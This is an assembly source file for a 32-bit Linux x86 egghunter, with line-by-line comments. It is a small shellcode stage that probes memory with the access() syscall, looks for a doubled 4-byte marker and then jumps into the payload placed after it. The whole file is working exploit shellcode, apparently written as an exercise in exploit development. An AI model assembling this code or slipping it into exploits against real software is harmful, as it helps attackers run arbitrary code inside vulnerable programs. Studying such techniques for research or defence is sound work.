; Filename: egghunter.nasm

global _start

section .text
_start:
    xor edx, edx        ; zeroing out the EDX register

set_page:
    ;sets EDX register to PAGE_SIZE-1 (4095)
    or dx, 0xfff        ; sets the EDX register to 0xfff;

increase_address:
    inc edx             ; increases the EDX register by one,

    ; int access(const char *pathname, int mode);
    lea ebx, [edx+0x4]  ; pathname
    push byte 0x21      ; system call number for access (33 decimal)
    pop eax             ; 0x21 value
    int 0x80            ; calling the syscall, returns 0xfffffff2 on EFAULT.

    cmp al, 0xf2        ; sets the Zero Flag when the comparison is true
    jz set_page       ; jump to set_page when ZF is set (not NULL)

    ; preparing the egghunt
    mov eax, 0x50905090 ; 4-byte egghunter key
    mov edi, edx        ; EDX register contains the memory address of writable page
    
    ; hunts for first 4 bytes of egg; scasd sets ZF when we find the match
    scasd               ; compares [EDI] to value in EAX register, increments EDI register by 4 
    jnz increase_address     ; jumps to inc_address when ZF is not set
    
    ; hunts for last 4 bytes of egg
    scasd               ; hunts for last 4 bytes of egg
    jnz increase_address

    ; jumps to the beginning of the shellcode
    jmp edi






